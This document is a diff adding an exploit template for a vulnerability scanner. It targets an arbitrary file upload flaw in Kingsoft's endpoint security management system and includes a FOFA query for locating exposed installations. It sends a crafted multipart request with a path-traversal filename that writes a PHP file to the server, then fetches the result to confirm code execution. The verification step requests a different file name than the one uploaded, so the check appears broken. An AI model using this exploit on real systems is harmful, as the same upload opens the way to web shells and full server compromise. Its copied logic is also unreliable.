@@ -1,0 +1,55 @@
+info:
+  vulId: kingsoft_edr_fileupload
+  detail: "金山终端安全管理系统管理员服务端口任意文件上传漏洞,shell地址为{{rootUrl}}/softmanagement/download/kingsoft_edr_fileupload_test.php"
+  fofaQuery: title="金山终端安全系统"
+rules:
+  - request:
+      payload:
+        - "<?php phpinfo(); ?>"
+      path: "{{rootUrl}}/inter/software_relation.php"
+      method: POST
+      headers:
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: "1"
+        Origin: "{{rootUrl}}"
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxRP5VjBKdqBrCixM
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Referer: "{{rootUrl}}/softmanagement/distribute/updatamain.php?m1=5&m2=0&m3=4"
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ""
+        Connection: close
+      redirect: false
+      dataTtpe: text
+      data: "------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"userSession\"\r\n\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"mode_id\"\r\n1\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolFileName\"\r\n\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolFileName\"\r\n\r\n./../default.png\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolDescri\"\r\n\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n0\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"version\"\r\n\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"sofe_typeof\"\r\n\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolName\"\r\n\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"fileSize\"\r\n\r\n\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"param\"\r\n\r\na\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolImage\"; filename=\"../../kingsoft_edr_fileupload_test.php\"\r\nContent-Type: image/png\r\n\r\n{{payload}}\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolImageType\"\r\n\r\n0\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolName\"\r\n\r\na\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"toolDescri\"\r\n\r\nb\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"version\"\r\n\r\nc\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM\r\nContent-Disposition: form-data; name=\"param\"\r\n\r\n1\r\n------WebKitFormBoundaryxRP5VjBKdqBrCixM--\r\n"
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - 上传更新成功
+        place: body
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/softmanagement/download/aacc.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataTtpe: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - PHP Extension
+          - PHP Version
+          - phpinfo
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
